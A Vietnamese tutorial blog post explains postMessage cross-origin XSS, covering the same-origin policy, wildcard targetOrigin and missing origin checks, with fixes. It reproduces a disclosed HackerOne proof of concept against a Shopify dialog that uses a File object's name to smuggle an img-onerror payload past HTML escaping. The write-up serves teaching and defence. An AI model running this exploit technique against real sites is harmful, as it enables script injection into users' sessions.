## 1. Khởi đầu câu chuyện

Lang thang trên Twitter đọc tin tức sau chuỗi ngày nghỉ lễ, bỗng thấy một Researcher đã có thâm niên nhiều năm đăng lên một lỗi XSS được Facebook trả $20,000 bounty. 

![](https://images.viblo.asia/32be84d7-652b-49ec-b516-1b24edb83583.png)


Report còn mới và chưa được disclosed nên chúng ta không thể biết chi tiết, tuy nhiên sau vài tweet qua lại thì chúng ta có thể nắm được cơ bản do đâu và vì đâu mà Facebook vẫn "còn" XSS tới $20,000 bounty, vì đây là một Bug Bounty Program siêu to khổng lồ và rộng khắp với hàng ngàn Bug Bounty Hunter ghé thăm hàng ngày.

![](https://images.viblo.asia/b7e97204-ef03-41a1-a6c9-50ed2d25f5b0.png)

Khi tìm kiếm từ khóa "postMessage hackerone", đây không phải một "lỗ hổng" mới, đã có những report từ lâu, các lỗi đa phần là XSS. Tuy nhiên nó cũng không phải "cũ". Nó được giới thiệu cùng với HTML5 với cái tên: Cross Document Messaging hay Web Messaging, tức là cũng lâu rồi, tuy nhiên những bài viết "biến nó thành lỗ hổng" thì đa phần mới chỉ từ 2015 trở về nay.

## 2. Cùng tìm hiểu

### 2.1 Câu chuyện "communicate" giữa 2 domain
Mặc định, sites có thể trao đổi thông tin, tài nguyên với nhau nếu chúng có cùng **Protocol**, **Domain** và **Port**, như hình dưới là tạch rồi:

![](https://images.viblo.asia/cf200af1-c1b4-47c8-b3b7-88a6515135e2.png)

Đây chính là [SOP](https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy) - **Same-Origin Policy** - cái tên nói lên tất cả. Same-origin policy sinh ra để quy định nội dung của một Website chỉ được đọc và thay đổi bởi một thành phần khác cùng site đó, nếu truy cập nằm ngoài phạm vi sẽ bị chặn. Tuy nhiên việc sử dụng SOP có hạn chế là gây khó khăn cho việc chia sẻ tài nguyên giữa các  Websites không cùng một domain. Điều này dẫn tới sự ra đời của khái niệm tiếp theo là [CORS](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS) - Cross-Origin Resource Sharing.

Nhưng bỗng nhiên, giả sử domain **something.viblo.asia** cần phải lấy địa chỉ email của người dùng, nó cần lấy địa chỉ email từ **accounts.viblo.asia**.  Với một nhiệm vụ rất đơn giản như vậy, CORS có thể là một vấn đề, vì nó cần thay đổi code ở server-side. **postMessage** thì dễ dàng và nhanh chóng hơn, chỉ cần thêm/thay đổi Javascript.

### 2.2. window.postMessage ?

Theo ["document"](https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage):

> The window.postMessage() method safely enables cross-origin communication between Window objects; e.g., between a page and a pop-up that it spawned, or between a page and an iframe embedded within it.

>Normally, scripts on different pages are allowed to access each other if and only if the pages they originate from share the same protocol, port number, and host (also known as the "same-origin policy"). window.postMessage() provides a controlled mechanism to securely circumvent this restriction (if used properly).

Thì window.postMessage là một cách để các site có thể Cross-Origin giữa các Windows objects một cách an toàn (nếu được thực hiện đúng), phá bỏ hạn chế của SOP đã được đề cập ở trên một cách **có kiểm soát**.

### 2.3. Vậy lỗi ở đâu ?

postMessage có 2 thành phần chính, đó là:

1. window.postMessage() — Để gửi message
2. window.addEventListener(“message”,callback) — để nhận và xử lý message

Syntax chung của postMessage như sau:

```targetWindow.postMessage(message, targetOrigin, [transfer]);```

Tham số [transfer] là optinal, trong bài viết này chúng ta sẽ không sử dụng.



| Name | Description |
| -------- | -------- |
| targetWindow     | Reference tới một windows hoặc iframe nào đó mà bạn muốn gửi message,     |
| message     | Dữ liệu cần gửi đến targetOrigin, có thể là String hoặc JSON Object (hoặc bất kỳ loại Object nào sẽ được clone trong process - [HTML5 structured clone algorithm](https://developer.mozilla.org/en-US/docs/Web/API/Web_Workers_API/Structured_clone_algorithm))     |
| targetOrigin     | Là phần cực kỳ quan trọng, chính là URL của trang nhận message. Tại thời điểm gửi đi  (postMessage), nếu  targetOrigin không khớp với host name của targetWindow’s page, message sẽ không được gửi đi. Nếu chỉ định `*` sẽ khiến nó khớp với mọi URL, tuy nhiên không được khuyến khích bởi lý do bảo mật.  |


<br>
Ví dụ như sau, sender tại: 

https://example.com/sender.html

```
var popup = window.open('https://mainpage.com');
function post(){popup.postMessage("hi","*")}
setInterval(post,1000);
```

Nếu https://mainpage.com không cài đặt một message event listener, thì đương nhiên sẽ không có gì xảy ra. Nếu có setup và setup không chính xác như ví dụ dưới đây, sẽ dẫn tới XSS (Cross Site Scripting):

```
window.addEventListener("message", function(event){alert(event.data);}, false);
```

setInterval() là một HTML Window-DOM, như setup phía trên, cứ mỗi 1 giây (1000ms), trang https://mainpage.com  sẽ hiện pop-up một lần.

Không chỉ có vậy, ví dụ trên đã cover đủ 2 kiểu chính của "lỗ hổng" này:

![](https://images.viblo.asia/639ecf68-f501-4f28-baa7-104a261e601f.png)

Ở sender, targetOrigin được chỉ định bằng `*`, có nghĩa message có thể gửi tới mọi origin mà không cần trùng khớp với targetWindow's page điều này có thể dẫn tới lộ thông tin. Ở Listener, nó đã không kiểm tra origin gửi đến, ví dụ thì đã nói ở trên.

### 2.4 Sửa thế nào ?

Thực sự việc sửa "lỗi" này không quá phức tạp, như đã đề cập phía trên, lập trình viên không sử dụng * khi setup sender và validate cẩn thận tại Listener bằng **event.origin** như ví dụ dưới đây:

```
window.addEventListener("message", function(event){if (event.origin!="https://mainpage.com"){return}alert(event.data);}, false);
```

Như vậy chỉ những postMessage từ https://mainpage.com được chấp nhận. Những postMessage từ https://example.com/sender.html sẽ trở nên vô nghĩa.

Hay tốt hơn là đọc docs thận cẩn thận:

> Always specify an exact target origin, not *, when you use postMessage to send data to other windows. A malicious site can change the location of the window without your knowledge, and therefore it can intercept the data sent using postMessage.

> Consequently, any event listener used to receive messages must first check the identity of the sender of the message, using the origin and possibly source properties. This cannot be overstated: Failure to check the origin and possibly source properties enables cross-site scripting attacks.

## 3. "Dễ" như vậy tại sao vẫn tồn tại lỗi $20,000

Thực tế report chưa được disclose nên chúng ta không thể biết chắc "lỗi" từ đâu. Tuy nhiên nhìn chung để khai thác lỗi này thường phải rất phức tạp và phải phân tích rất kỹ. Hi vọng trong tương lai thì author sẽ viết Write-up cho nó !

Bây giờ chúng ta có thể nhìn vào những report khác như ví dụ "tiêu biểu" [này](https://hackerone.com/reports/231053): 

Technical Details thực sự rất dài, hãy tập trung vào POC và phân tích ngược:


POC:

```
<!DOCTYPE html>
<html>
	<body>
		<script>
		let shop = prompt("Enter a Target Shop URL:", "https://bored-engineering-whitehat-2.myshopify.com");
		let frame = document.createElement("iframe");
		frame.src = `${shop}/1337/digital_wallets/dialog`;
		frame.style.display = "none";
		frame.onload = () => {
			frame.contentWindow.postMessage({
		        type: "DigitalWalletsDialog:change",
		        digitalWalletsDialog: true,
		        payload: {
		            title: "placeholder",
		            button: "placeholder",
		            lineItems: [new File([""], "<img src=xx: onerror=alert(document.domain)>")],
		        },
		    }, "*");
		}
		document.body.appendChild(frame);
		</script>
	</body>
</html>
```

**/:id/digital_wallets/dialog** chính là endpoint có "lỗi", được sử dụng để hiển thị một hộp thoại nhỏ liên quan đến chức năng "digital wallets" shop. ID ví dụ tại đây là 1337.

Ở message gửi đi của postMessage, reseacher đã gửi đi một Object, để ra được POC như trên là thành quả phân tích rất dài:

```
window.postMessage({
  type: "DigitalWalletsDialog:change",
  digitalWalletsDialog: true,
  payload: {
    title: "placeholder",
    button: "placeholder"
  },
}, "*");
```

Với payload trên, một message có thể được gửi đi một cách hợp lệ và được render như hình bên dưới:

![](https://images.viblo.asia/23245a90-027d-4221-b91b-4b10aee583c7.png)

Sau khi phân tích thêm, ông nhận ra một chuỗi các function có liên quan tới nhau nhằm sử dụng **payload.lineItems** để render, với các giá trị trả về là name, image và amount. Payload lúc này có dạng:

```
window.postMessage({
  type: "DigitalWalletsDialog:change",
  digitalWalletsDialog: true,
  payload: {
    title: "placeholder",
    button: "placeholder",
    lineItems: [{
      name: "product",
      amount: "$13.37",
      message: "added to cart"
    }],
  },
}, "*");
```

Và pop-up như sau:

![](https://images.viblo.asia/6741a65e-6c3c-47ed-b9ad-160d5a3fab8a.png)

Câu chuyện ở đây đó là có một function **u** được sử dụng để escape toàn bộ  attributes của payload nhằm ngăn chặn HTML Injection. Thay vì tạo ra một Object mới được escape cẩn thận, nó sẽ ghi đè những properties của Object đã tồn tại.

```
function u(payload) {
  for (var idx in payload) {
    if (payload.hasOwnProperty(idx)) {
      payload[idx] = Ve.escapeHtml(payload[idx]);
    }
  }
  return payload;
}
```

Đúng là Listener không validate cẩn thận Origin, như vậy cũng đã là lỗi, nhưng impact sẽ rất thấp. Tại đây research đã phân tích và sử dụng một thứ "tính năng" được định nghĩa rất rõ ràng trong Message của postMessage:

![](https://images.viblo.asia/32ba285f-0c66-49f8-b5fc-224483ae4ef9.png)

Như vậy nếu researcher sử dụng một Object mà có Properties không liên quan/ảnh hưởng bởi **hasOwnProperty** thì sẽ không bị function **escapeHtml** ghi đè, những Properties của Objects không bị ảnh hưởng bao gồm:

* variant
* name
* image
* message

Nhưng vấn đề lớn hơn nữa đó là Object đó phải được hỗ trợ bởi  HTML5 structured clone algorithm. Đó là lý do Object **Error** rất hoàn hảo và được phát hiện sớm nhưng không được sử dụng.  Danh sách các Object cho postMessage được xác định là một phần của [HTML5 structured clone algorithm](https://developer.mozilla.org/en-US/docs/Web/API/Web_Workers_API/Structured_clone_algorithm).

![](https://images.viblo.asia/02086785-26b8-4b66-a208-a5cb204fad12.png)

Sau khi thử nghiệm từng cái, ông nhận thấy Object **File** là cực kỳ hoàn hảo để khai thác, bởi nó chỉ có read-only **name** property.

```
lineItems: [new File([""], "<img src=xx: onerror=alert(document.domain)>")],
```

Sau tất cả, ông hoàn tất POC nói trên, submit và nhận $3,000 tiền bounty !

## 4. Tổng kết

HTTP, HTML nói riêng và thế giới Web nói chung thực sự rộng lớn !

Những lỗi liên quan tới postMessage thường do "misconfig", thêm vào đó bị bypass như ví dụ trên để tăng impact hoặc do sử dụng Sender/Listener của bên thứ 3 có lỗi, như [ví dụ](https://hackerone.com/reports/398054) này.

Lỗi không mới, khá khó phân tích và khai thác nhưng đáng để tìm hiểu !

**TOP DEV - Hãy ngưng ăn cắp**

## 5. Tài liệu tham khảo

https://hackerone.com/reports/231053

https://ngailong.wordpress.com/2018/02/13/the-mystery-of-postmessage/

https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage

https://medium.com/javascript-in-plain-english/javascript-and-window-postmessage-a60c8f6adea9

https://labs.detectify.com/2016/12/08/the-pitfalls-of-postmessage/

https://labs.detectify.com/2016/12/15/postmessage-xss-on-a-million-sites/